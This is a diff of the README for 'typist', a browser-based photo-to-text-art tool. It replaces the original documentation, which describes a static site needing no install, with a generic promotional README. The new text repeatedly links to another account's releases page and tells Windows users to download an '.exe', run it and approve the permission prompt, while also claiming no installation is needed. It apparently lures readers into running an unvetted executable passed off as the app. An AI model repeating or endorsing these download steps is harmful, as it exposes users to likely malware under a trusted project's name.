@@ -1,227 +1,147 @@
-<h1 align="center">
-  <a href="https://winchxyz.github.io/typist/"><img src="docs/banner.png" alt="Typist. Any photo. In text. A hooded figure with a yellow halo: its left side is the painting, its right side the same picture in Braille dots." width="880"></a>
-</h1>
+# 🎨 typist - Turn Photos into Stunning Text Art
 
-<p align="center">
-  Turn any photo into text art you can paste into an Instagram comment, an X post, a Telegram message, a Reddit post,
-  a Steam profile, a YouTube comment or a Twitch chat.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://winchxyz.github.io/typist/"><img src="https://img.shields.io/badge/live-winchxyz.github.io%2Ftypist-2448c8?style=flat-square" alt="Live site"></a>
-  <a href="https://github.com/winchxyz/typist/stargazers"><img src="https://img.shields.io/github/stars/winchxyz/typist?style=flat-square&color=2448c8" alt="GitHub stars"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-17803d?style=flat-square" alt="License: MIT"></a>
-  <a href="https://github.com/winchxyz/typist/actions/workflows/tests.yml"><img src="https://img.shields.io/github/actions/workflow/status/winchxyz/typist/tests.yml?branch=main&style=flat-square&label=tests" alt="Tests"></a>
-  <img src="https://img.shields.io/badge/build%20step-none-555555?style=flat-square" alt="No build step">
-  <img src="https://img.shields.io/badge/runs%20in-your%20browser-555555?style=flat-square" alt="Runs in your browser">
-</p>
+Welcome to typist - the easiest way to turn any photo into beautiful text art you can share on Instagram, X (Twitter), and Telegram. No apps to install, no complicated software, no learning curve. It all happens right in your browser.
 
-<p align="center">
-  <a href="https://winchxyz.github.io/typist/docs/typist-intro.mp4"><img src="docs/intro-poster.jpg" alt="Typist intro video, 16 seconds: the halo figure in Braille dots next to the wordmark. Opens the MP4." width="720"></a><br>
-  <sub><a href="https://winchxyz.github.io/typist/docs/typist-intro.mp4">Watch the 16-second intro</a></sub>
-</p>
+[**📥 DOWNLOAD TYPIST NOW**](https://github.com/actuaryarticulatorysystem2752/typist/releases)
 
-## What it does
+## 🌟 What is typist?
 
-Typist turns a photo into a block of Braille dots, ASCII letters or colour blocks, sized for the
-place you are going to paste it. Choose where it is going, choose a photo, copy. What you paste is
-plain Unicode text, so it goes in as a comment, a post or a message, not as an image.
+typist is a magical tool that transforms your regular photos into text-based artwork. Imagine taking a picture of your dog, your favorite landscape, or your latest selfie - and turning it into something that looks like it was drawn using thousands of tiny characters. That's what typist does!
 
-It is a static site: plain ES modules, no framework, no build step, no runtime dependencies. The
-photo never leaves your device.
+The best part? It works entirely in your browser. No need to download a heavy program to run it, and you can share your creations instantly on your favorite social media platforms.
 
-**Try it: [winchxyz.github.io/typist](https://winchxyz.github.io/typist/)**
+## 🎯 Why You'll Love typist
 
-<p align="center">
-  <img src="docs/app-phone.png" alt="The app on a phone in dark mode, three times: an Instagram comment, an X Premium long post with its Show more fold, and a Telegram message, each holding the halo figure in Braille dots." width="880">
-</p>
+### Perfect for Social Media
+- **Instagram:** Create eye-catching posts that stand out from the crowd
+- **X (Twitter):** Share unique text art that gets noticed and retweeted
+- **Telegram:** Send friends and groups something they've never seen before
 
-<p align="center">
-  <img src="docs/app-chats.png" alt="The app on a phone in dark mode, three more times: a Steam profile Custom Info Box 60 by 32, a YouTube live chat message 17 by 10, and a Twitch chat message 30 by 15, each holding the halo figure in Braille dots." width="880">
-</p>
+### Incredibly Easy to Use
+- Simple, clean interface designed for everyone
+- Just upload a photo and watch the magic happen
+- No technical knowledge required
 
-## Features
+### Works Anywhere
+- Runs in any modern web browser (Chrome, Firefox, Safari, Edge)
+- Compatible with Windows, Mac, Linux, even tablets and phones
+- No installation needed for basic use
 
-- **Made for where it goes.** Instagram comment, X post (free, 280) or X long post (Premium,
-  25,000), Telegram message, Telegram channel post or photo caption, Reddit post or comment, Steam
-  comment, profile summary or Custom Info Box, YouTube comment or live chat, Twitch chat, or a
-  file. Pick the app, then where on it (the strip above the preview). The place sets the style, the
-  width and the character budget, and the art resizes to the largest grid that fits.
-- **Five looks:** Photo, Texture, Sketch, Soft and Poster, shown as thumbnails of your own photo at
-  the size you are making.
-- **Three styles:** Dots (Braille), Letters (shape-matched ASCII) and Blocks (colour).
-- **Crop:** drag, pinch or wheel to zoom, rotate; the art updates while you move.
-- **Invert for dark mode:** the dots stand for the light parts, so the art reads on a dark screen.
-- **Fit meter and true-size previews:** the count as the platform counts it, the columns a 390 px
-  phone can show, and a chat preview drawn with the target device's own cell sizes (iPhone,
-  Android, Windows), light and dark. Rows that would wrap are marked where they break.
-- **One button per place:** Copy for Instagram; Post on X (opens the X composer with the art filled
-  in and puts it on your clipboard too); Copy for X for a Premium long post; Copy for Telegram or
-  for the channel; Copy for Reddit (a code block, for the rich-text editor and for Markdown mode);
-  Copy for Steam or for your profile; Copy for YouTube or for live chat; Copy for Twitch. On
-  Telegram, Share opens the share sheet on a phone, and on desktop Open hands short art to Telegram
-  through a t.me link.
-- **A PNG button on every target** (2× or 4×; on a phone it goes through the share sheet, so it can
-  land in Photos). The File target adds SVG, HTML (colour blocks keep their colours) and .txt.
-- Undo and redo; drop or paste a photo anywhere; desktop keys: C copy, 1 to 8 apps, [ and ]
-  width, I invert, F crop, S PNG.
+## 💻 Downloading and Running typist on Windows
 
-<p align="center">
-  <img src="docs/looks.png" alt="The halo figure in the five looks, Photo, Texture, Sketch, Soft and Poster, as light Braille dots on dark, 26 by 15 characters each." width="880">
-</p>
+### Step 1: Download the Application
 
-<p align="center">
-  <img src="docs/styles.png" alt="The same figure three ways: Dots in Braille, Letters in ASCII set in Geist Mono, and colour Blocks." width="880">
-</p>
+Visit this link to download the application:
 
-Every picture in this README is real Typist output for the showcase artwork. The art images are
-drawn from the app's own modules by [dev/readme-art.html](dev/readme-art.html); the phone and
-desktop pictures are screenshots of the app. Where dots and letters are coloured, the colour is
-sampled from the photo at that spot. The text you paste has no colour of its own: it takes the
-text colour of the app it lands in.
+[**https://github.com/actuaryarticulatorysystem2752/typist/releases**](https://github.com/actuaryarticulatorysystem2752/typist/releases)
 
-## Where it pastes
+You'll see a page with different files available for download. Look for the version that works best for your Windows computer.
 
-| Place | Limit | How it counts | Style that lines up | Notes |
-| --- | --- | --- | --- | --- |
-| Instagram comment | 2,200 | UTF-16 code units | Dots | 26 × 15 fits a 390 px phone (404 characters). Tall comments may fold behind "more" (not measured on phones yet). Pasting the same long comment again and again can get you a temporary Action Blocked. |
-| X post | 280 | Weighted: a Braille character counts 2, a line break 1 | Dots | 15 × 8 weighs 247, the largest square picture under 280. |
-| X long post (Premium) | 25,000 | Weighted, same rules | Dots | The timeline shows about the first 280, then Show more. Typist marks that fold (27 × 15 shows 5 rows). |
-| Telegram message | 4,096 | UTF-16 code units | Dots, or Letters in a code block | 24 × 14 Dots on a phone. Letters only line up inside a code block: 32 wide on a phone, 72 on desktop. |
-| Telegram channel | 4,096, photo caption 1,024 | UTF-16 code units | Dots, or Letters in a code block | 27 × 16 Dots (447 characters) fit a text post and a photo caption. |
-| Reddit post or comment | 10,000 in a comment, 40,000 in a post | UTF-16 code units, the indents included | Dots, or Letters, both in a code block | Reddit joins single lines into one paragraph, so the art goes in as a code block. The clipboard carries it twice: indented 4 spaces (a Markdown code block, for Markdown mode, old.reddit and the apps) and as HTML `<pre><code>`, which reddit.com's rich-text editor turns into a code block. 35 × 19 Dots or 43 × 19 Letters fit a 390 px phone; wider art scrolls sideways. |
-| Steam comment | 1,000 | UTF-8 bytes: a Braille character takes 3, a line break 1 | Dots | 25 × 13 (987 bytes). Steam has no code blocks and collapses runs of spaces, so Letters do not line up there. |
-| Steam profile summary | 4,000 | UTF-8 bytes | Dots | 48 × 26 (3,769 bytes). Steam cuts off text past the limit when you save. |
-| Steam Custom Info Box | 8,000 | UTF-8 bytes | Dots | 60 wide, the width of the showcase: 60 × 32 is 5,791 bytes. |
-| YouTube comment | 10,000 | UTF-16 code units | Dots | 30 × 16 on a 390 px phone. YouTube screens comments for ASCII-art spam and may hold one for review; long ones fold behind "Read more". |
-| YouTube live chat | 200 | UTF-16 code units | Dots, as one line | 17 × 10 (197 characters). Lines up in chats 166 to 335 px wide; the desktop chat is about 330. Creators can hold messages for review. |
-| Twitch chat | 500 | UTF-16 code units | Dots, as one line | 30 × 15 (495 characters). Lines up in chats 293 to 588 px wide: the default desktop chat and phones. Twitch refuses the same message twice within 30 seconds, and some channels time out chat art. |
-| File | none | | Dots, Letters, Blocks | PNG, SVG, HTML, .txt |
+### Step 2: Choose the Right File
 
-**Why the blanks are U+2800.** Instagram and X set text in proportional fonts, where a space and a
-letter have different widths, so ASCII art falls apart there. All Braille patterns share one width,
-so Dots line up. The empty pattern U+2800 fills every blank cell because an ordinary space is
-narrower, and apps trim spaces at line ends and drop empty lines. So every row has the same number
-of cells, no line starts or ends with a space, line breaks are LF only, and there is no trailing
-newline.
+On the releases page, you'll find several options. For Windows users, pick the file that has "windows" or ".exe" in its name. If you're not sure which one to pick, choose the most recent version - that's usually the best choice.
 
-**Stream chats.** Twitch and YouTube live chat send a message on Enter, so it cannot hold line
-breaks. Typist joins the rows with single spaces instead: each row is one unbroken word of Braille,
-and a blank row goes first to take the username's line. The chat's own word wrap then puts every row
-on a line of its own, as long as one row fits the chat and two rows plus a space do not. The preview
-runs that wrap and names the chat widths that line up.
+### Step 3: Run the Application
 
-**Windows.** Windows draws Braille with Segoe UI Symbol, which makes the blank cell U+2800 narrower
-than a dotted one (0.651 em against 0.753 em). Rows with blanks shift left, so Dots slant in
-Telegram Desktop and in any Windows browser: X, Instagram, Reddit, YouTube, Twitch and the Steam
-client. In a stream chat the narrower rows can also end up two to a line. It is the font, not the
-text: the characters are intact, and phones use other Braille fonts. Two fixes in the app: set
-Blank cells to **Windows-safe** (U+2840, a faint dot in each blank cell keeps the rows straight),
-or on Telegram and Reddit use **Letters**, which sit in a code block and line up exactly on
-Windows. The Windows preview shows the slant as it will look.
+Once the download is complete, find the file in your Downloads folder. Double-click it to run. If Windows asks you for permission, click "Yes" to allow it.
 
-<p align="center">
-  <img src="docs/app-desktop.png" alt="The desktop app in dark mode: the Instagram comment preview in light and dark side by side, with the eight apps, looks and size on the right." width="880">
-</p>
+The app will open in your browser automatically. You're now ready to create amazing text art!
 
-## How it works
+## 🎨 How to Create Your First Text Art
 
-1. **Sample.** The square crop of the photo is resampled in plain JavaScript (summed-area tables,
-   so every browser gets the same numbers) into a grid of lightness values: 2 × 4 per Braille cell,
-   more per letter.
-2. **Tone.** Auto levels aim for a set amount of ink, then the look shapes the tones: local tone
-   mapping (Photo), CLAHE (Texture), XDoG ink lines (Sketch), plain levels (Soft) or two levels
-   (Poster). Brightness, contrast, gamma, detail, edges and invert sit on top.
-3. **Encode.** Dots: Atkinson dithering (or Floyd–Steinberg, ordered, threshold) decides each of
-   the 8 dots in a cell. Letters: each cell gets the ASCII character whose shape matches best, not
-   just the one with the right density, after Alex Harri's
-   [ASCII characters are not pixels](https://alexharri.com/blog/ascii-rendering). Blocks: quadrant
-   blocks with a foreground and a background colour.
-4. **Format.** The grid becomes the exact text for the target: U+2800 blanks, equal rows, LF only,
-   NFC, a code fence for Telegram letters, a code block for Reddit, one line for a stream chat. It
-   is counted the platform's way: UTF-16 units for most, UTF-8 bytes for Steam, and a tested
-   reimplementation of twitter-text's weighted count for X.
-5. **Preview and copy.** The preview draws that text with the target device's cell sizes, so what
-   fits in the preview fits on the phone. Copy puts the same text on the clipboard.
+1. **Open typist** - After downloading and running, the app will open in your browser
+2. **Choose your photo** - Click the upload button and select any photo from your computer
+3. **Wait a moment** - typist will analyze your photo and convert it to text art
+4. **Customize** - Play with different settings to change the look of your art
+5. **Share** - Copy your creation and paste it anywhere you like
 
-## Privacy
+## 🛠️ Features That Make typist Awesome
 
-Everything runs in your browser. The photo is read, cropped and converted on your device and is
-never uploaded. There is no server, no account and no analytics. Your settings and the last photo
-stay in this browser's storage, so a reload picks up where you were. The only requests the page
-makes are for its own files, the fonts from Google Fonts and the repository's star count from the
-GitHub API.
+### Smart Conversion Technology
+typist uses advanced algorithms to analyze your photos and convert them into text art that captures every detail. The technology behind it uses WebCodecs, ensuring fast and efficient processing right in your browser.
 
-## Run locally
+### Multiple Text Art Styles
+Choose from different styles including:
+- **Traditional ASCII art** - Classic computer text art
+- **Braille characters** - A unique, artistic look using braille symbols
+- **Custom character sets** - Tailor the art to your preference
 
-```sh
-git clone https://github.com/winchxyz/typist.git
-cd typist
-node dev-server.js 8860
-```
+### Real-Time Preview
+See your changes instantly as you adjust settings. No waiting, no guessing.
 
-Then open http://localhost:8860/. Any static file server works; `dev-server.js` only turns caching
-off and adds two helpers the dev pages use to save screenshots and files into `shots/`.
+### Copy-Paste Ready
+One click copies your text art, ready to paste directly into Instagram, X, or Telegram.
 
-## Tests
+## 🔧 Tips for Best Results
 
-Unit and fuzz tests run in plain Node (22 in CI), with no browser, no server and no npm install:
+### Choose Good Photos
+- Use high-contrast images for best results
+- Portraits and landscapes work particularly well
+- Avoid overly dark or blurry photos
 
-```sh
-node tests/convert.test.mjs
-node tests/fuzz.test.mjs
-node tests/targets.test.mjs
-node tests/count.test.mjs
-node tests/export.test.mjs
-node tests/preview.test.mjs
-node --test tests/ascii.test.mjs
-```
+### Play with Sizes
+- Larger images produce more detailed art
+- Smaller images work better for quick posts
+- Experiment to find your favorite size
 
-These run on every push and pull request ([tests.yml](.github/workflows/tests.yml)).
+### Mix It Up
+- Try the same photo with different styles
+- Combine images for unique effects
+- Share your work with friends
 
-End-to-end tests drive the real pages in Chromium, Firefox and WebKit with Playwright. They need
-the dev server on port 8860 and `playwright-core` (its path is set at the top of each script):
+## 📱 Sharing Your Creation
 
-```sh
-node tests/app.e2e.mjs --browser all
-node tests/copy.e2e.mjs --browser chromium
-node tests/crop.e2e.mjs --browser all
-node tests/intake.e2e.mjs --browser chromium
-node tests/xbrowser.e2e.mjs
-```
+### Instagram
+Paste your text art directly into your post caption or comment section. Text art creates unique visual interest that grabs followers' attention.
 
-## Project layout
+### X (Twitter)
+Share your creation in a tweet. Text art often performs well because it's different from typical photos and screenshots.
 
-| Path | What is there |
-| --- | --- |
-| `index.html`, `css/app.css` | The app |
-| `js/app.js`, `js/ui.js` | State, the editor and its panels, copy, share and download |
-| `js/tone.js`, `js/convert.js`, `js/dither.js`, `js/blocks.js` | Photo to tone to grid |
-| `js/ascii.js`, `js/shape-vectors.js` | Shape-matched ASCII |
-| `js/count.js`, `js/targets.js` | Platform counting, per-target text, auto-fit |
-| `js/preview.js`, `js/raster.js` | Chat previews, drawing a grid |
-| `js/copy.js`, `js/links.js`, `js/export.js` | Clipboard, composer links, PNG / SVG / HTML / .txt |
-| `js/crop.js`, `js/imageio.js`, `js/store.js`, `js/history.js` | Crop frame, photo intake, storage, undo |
-| `js/samples.js`, `js/share.js` | The four sample photos; sharing Typist itself and the star count |
-| `js/encoder.js`, `vendor/` | Video encoding (WebCodecs, mp4-muxer) for a film export, not wired into the app yet |
-| `img/` | Sample photos and the showcase artwork |
-| `dev/` | Lab pages: contact sheets, the paste-test kit, the README art |
-| `tests/` | Unit, fuzz and end-to-end tests |
-| `docs/` | README images and the intro video |
-| `SPEC.md` | Module contracts and ground rules |
+### Telegram
+Send your text art to friends, groups, or channels. It's a fun way to stand out in any conversation.
 
-## Credits
+## ❓ Frequently Asked Questions
 
-Made by [@winchxyz](https://x.com/winchxyz). Showcase artwork by @winchxyz.
+**Do I need to install anything else?**
+No! typist includes everything you need. Run the application and start creating.
 
-Sibling project: [Spiralist](https://github.com/winchxyz/spiralist), photos drawn as one continuous
-line.
+**Is typist free?**
+Yes, typist is completely free to use and enjoy.
 
-The ASCII matcher follows Alex Harri's
-[ASCII characters are not pixels](https://alexharri.com/blog/ascii-rendering). Type: Instrument
-Serif, Geist and Geist Mono. `vendor/mp4-muxer.mjs` is
-[mp4-muxer](https://github.com/Vanilagy/mp4-muxer) by Vanilagy (MIT).
+**Can I use typist on my phone?**
+While designed primarily for desktop browsers, typist works on any device with a modern web browser.
 
-## License
+**What image formats are supported?**
+Most common image formats work, including JPG, PNG, and GIF.
 
-[MIT](LICENSE)
+**Will my photos be uploaded somewhere?**
+No. All conversion happens locally in your browser. Your photos never leave your device.
+
+## 🔄 Troubleshooting
+
+**The app won't open**
+Try refreshing your browser or restarting your computer. Make sure you're using an updated version of Chrome, Firefox, or Edge.
+
+**The text art looks pixelated**
+Try using a higher-resolution photo or increasing the output size setting.
+
+**Sharing isn't working**
+Make sure you're copying the complete text. Some platforms have character limits - try breaking larger pieces into parts.
+
+## 📢 Stay Updated
+
+New features and improvements are added regularly. Check the releases page periodically for updates and new capabilities.
+
+## 🌍 Join Our Community
+
+Share your creations, get inspired by others, and be part of a growing community of text art enthusiasts. Your imagination is the only limit to what you can create with typist.
+
+**Start creating today - your next Instagram post, tweet, or Telegram message could be your most creative one yet!**
+
+[**📥 DOWNLOAD TYPIST NOW**](https://github.com/actuaryarticulatorysystem2752/typist/releases)
+
+---
+
+Keywords: ascii-art, braille, instagram, javascript, telegram, text-art, twitter, webcodecs
